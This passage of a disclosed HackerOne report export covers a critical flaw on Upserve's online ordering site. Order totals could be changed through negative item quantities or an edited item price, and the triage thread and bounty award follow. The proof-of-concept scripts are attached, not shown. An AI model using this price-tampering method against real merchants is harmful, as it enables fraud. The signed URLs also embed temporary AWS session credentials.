mBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=69ceb5c155e152966b66457d9da55f08d4c17d4bf0a6184920586e8dd6210b80","file_size":13138,"type":"image/png"},{"id":307764,"file_name":"Screen_Shot_2018-06-11_at_2.36.48_PM.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/307/764/b0e89b032f9b547fa49cd97e6938e48265cb6083/Screen_Shot_2018-06-11_at_2.36.48_PM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-06-11_at_2.36.48_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-06-11_at_2.36.48_PM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=372abeed2706e8ee08543d82aabdce6ee85d53fd505a22db6352c749b434c495","file_size":43186,"type":"image/png"}],"allow_singular_disclosure_at":"2019-07-06T17:58:56.937Z","allow_singular_disclosure_after":-46784724.40799597,"singular_disclosure_allowed":true,"vote_count":138,"voters":["sultancad","hunter","bl4de","spam404","base_64","sameerphad72","yumi","ahiezer","mygf","tulswani","and 128 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":9988,"asset_type":"URL","asset_identifier":"orders.upserve.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2871531,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Added an attachment containing the PoC code in Python.","markdown_message":"\u003cp\u003eAdded an attachment containing the PoC code in Python.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-11T22:05:05.419Z","updated_at":"2018-06-11T22:05:05.419Z","actor":{"username":"fuzz","cleared":false,"url":"/fuzz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":307765,"filename":"order.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/307/765/87cad4abfa72201776c692d8f029fba4f60075bf/order.py?response-content-disposition=attachment%3B%20filename%3D%22order.py%22%3B%20filename%2A%3DUTF-8%27%27order.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=d41dbd7052c6d93f0adb47eb80014082dbd39321ca741152145ada4accaf4cba"}],"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2873885,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @fuzz I saw the order come in on this, so this certainly appears valid, but I'll double check the PoC just to make sure we can repro it. Also, I don't know if you kept good records, but I saw you submit another order `upserve-hacker-cafe-27072` where the item price came in a $0.01 but the payment was $13.20. If you know how to repro that, that could be a second bug.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/fuzz\"\u003e@fuzz\u003c/a\u003e I saw the order come in on this, so this certainly appears valid, but I\u0026#39;ll double check the PoC just to make sure we can repro it. Also, I don\u0026#39;t know if you kept good records, but I saw you submit another order \u003ccode\u003eupserve-hacker-cafe-27072\u003c/code\u003e where the item price came in a $0.01 but the payment was $13.20. If you know how to repro that, that could be a second bug.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T12:58:32.711Z","updated_at":"2018-06-12T12:58:32.711Z","actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2873926,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-12T13:14:52.040Z","updated_at":"2018-06-12T13:14:52.040Z","actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2873987,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"PoC validated @fuzz. There is also a second bug exposed by your PoC where the system will accept an order without the delivery fee element as long as it is factored into the total. This results in an out of balance check. That's a much lower impact bug, but we'll factor it into the reward here.","markdown_message":"\u003cp\u003ePoC validated \u003ca href=\"/fuzz\"\u003e@fuzz\u003c/a\u003e. There is also a second bug exposed by your PoC where the system will accept an order without the delivery fee element as long as it is factored into the total. This results in an out of balance check. That\u0026#39;s a much lower impact bug, but we\u0026#39;ll factor it into the reward here.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T13:28:24.599Z","updated_at":"2018-06-12T13:28:24.599Z","actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2874422,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @upserve-bryan, the item price of $0.01 is due to manipulating the price key in the items array. I can also also set other values such as taxes to 0. The total has to be calculated correctly though, including fees and taxes otherwise the API returns an error.\n\nI just submitted `upserve-hacker-cafe-999999` which should demonstrate this again.\n\nI can see the response JSON from the consumer_info endpoint that your database is storing the modified price, but I'm not sure what kind of impact that would have on your systems (possibly your analytics platforms, if those values are taken into consideration).\n\nThe script that sends the modified item price, as well as a screenshot of the order history object are attached.\n\nCheers,\nMatt\n","markdown_message":"\u003cp\u003eHi \u003ca href=\"/upserve-bryan\"\u003e@upserve-bryan\u003c/a\u003e, the item price of $0.01 is due to manipulating the price key in the items array. I can also also set other values such as taxes to 0. The total has to be calculated correctly though, including fees and taxes otherwise the API returns an error.\u003c/p\u003e\n\n\u003cp\u003eI just submitted \u003ccode\u003eupserve-hacker-cafe-999999\u003c/code\u003e which should demonstrate this again.\u003c/p\u003e\n\n\u003cp\u003eI can see the response JSON from the consumer_info endpoint that your database is storing the modified price, but I\u0026#39;m not sure what kind of impact that would have on your systems (possibly your analytics platforms, if those values are taken into consideration).\u003c/p\u003e\n\n\u003cp\u003eThe script that sends the modified item price, as well as a screenshot of the order history object are attached.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nMatt\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T16:31:41.112Z","updated_at":"2018-06-12T16:31:41.112Z","actor":{"username":"fuzz","cleared":false,"url":"/fuzz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":308079,"filename":"Screen_Shot_2018-06-12_at_9.27.39_AM.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/308/079/61cdb6096ec08f096333a9bc5b4165b74254006f/Screen_Shot_2018-06-12_at_9.27.39_AM.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2018-06-12_at_9.27.39_AM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2018-06-12_at_9.27.39_AM.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=5f4c61d4ea3c15e4d91159fdb9c2c2303456dba461b16a21f7447c18710d9da7"},{"id":308078,"filename":"order2.py","type":"text/x-python","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/308/078/805e83b0b72666c6a58ae2feb39e7c770f6d64d4/order2.py?response-content-disposition=attachment%3B%20filename%3D%22order2.py%22%3B%20filename%2A%3DUTF-8%27%27order2.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQR35GR77K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T054421Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCkRanG9z5zVLdCyDzQPrLE3FYUPIiibXLrC%2FbV7ethQgIgW3VYr7ML9zFS7keXgTden2zkvr6xtk%2Bwqk4LfHGPkcUqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCiVagLxMUVikdnfsCqRA2ESo%2FIThyM%2BI3TCZtigaox50Q4zhKxTQUgUM4jlR9ukMcmdu%2BCIgxqNXnFit2GwvZneedN1j%2Bbb2Lf%2Fk9LJIBloG0%2BBQ0DIW5llPzhlHBsf8qtXHgtlw3rsN1B9wIqRFFMGG4erHLHiQ927dumft3fH4WdUWWVFhaFZW%2Bw4BBxYga3%2FaAi3ovDfVVALXK5%2BpCaFWVs%2FpaNk%2FyE3nUH75JZvja1tpNt%2F6qsqsoaXl8ySebrstQXUEOB%2Be7AzgomPo1txxlxQRCWAxLJ91zb%2F8zbc4Mpqm3pYwpxNZNRMuJXf4gzHggFM%2F7EkopM926Hsh9N4eLnJ1YBbqX5nnqAx55PEzHirbBxZ31aDZRbfbmB1%2BCiOEV8iMEpwvIsyUZuOSffvpzs7Qe3dj2pI6zhzA0wUT5LPywpwV5LVDQwbGng87pA%2Bgtcg27onS7Jn48hXv6UkYG%2FjlBuSEho0agiNLjv8bIxpSHhah2llBo0iC%2FiJ6%2FmqISjfYpqB%2FXgA1aFX1J8VmBmDpEvse7vhRyn5GK%2BNMMjyqv8FOusBHTvY1UWZJTekbF8f0h5%2Fm9EETlkX57JGosj1P6za%2F%2BD1YhhGhxzYMqBjP4hJZrSDsKea8vBxlLbsPJ8Zp1AAhrC9YRtCof2hTYz2%2BhsURQSGCBeuFyIDmWSH5JQoO43ilJhDzyewxnrYD%2BeM5KfEX4%2Fn5D9vBPxSv0EAr8PalTK5ZAcoJBHWWJ9pMQRjAqFKZVsT5TOjOi1OL0hsm4jWxfvejzxF5%2F3DrF%2BlMwOzwjOAJZgOrX0soe5jTVlSMpmCtRzgiDMIQz0P5TQyzi0oxvgKgrkhIF7bwqbkYqDYIH4z2J2IflgXhzV%2BUQ%3D%3D\u0026X-Amz-Signature=931f9f83e72e58795644a503ad322b6f4fbba7d91a60347a83dbbdbba4acf9ec"}],"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2874506,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks @fuzz. The order comes in out of balance, so the restaurant has to resolve that before they can close the check. There definitely could be some impact there depending on how the restaurant decides to proceed. It all traces back to the same root cause which is how we're validating the order total. Good find.","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/fuzz\"\u003e@fuzz\u003c/a\u003e. The order comes in out of balance, so the restaurant has to resolve that before they can close the check. There definitely could be some impact there depending on how the restaurant decides to proceed. It all traces back to the same root cause which is how we\u0026#39;re validating the order total. Good find.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-12T16:54:35.772Z","updated_at":"2018-06-12T16:54:35.772Z","actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2922552,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-22T14:41:31.328Z","updated_at":"2018-06-22T14:41:31.328Z","actor":{"url":"/upserve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Upserve "}},"bounty_amount":"3500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"upserve","collaborator":{"username":"fuzz","url":"/fuzz"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3097053,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-07-25T14:47:07.515Z","updated_at":"2018-07-25T14:47:07.515Z","actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"fuzz","url":"/fuzz"},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5018687,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-06T17:58:56.849Z","updated_at":"2019-06-06T17:58:56.849Z","first_to_agree":true,"actor":{"username":"upserve-bryan","cleared":false,"url":"/upserve-bryan","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/177/914/953184670ceb43d71870f5de769683ac4614b579_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5264762,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-06T17:59:06.505Z","updated_at":"2019-07-06T17:59:06.505Z","actor":{"url":"/upserve","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/981/780e51432acea84f3fe52455f0009230a87ee31e_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Upserve "}},"genius_execution_id":null,"team_handle":"upserve","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":16536,"category":"team","content":"The total amount of an order could be modified by including an item with a negative quantity.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eThe total amount of an order could be modified by including an item with a negative quantity.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}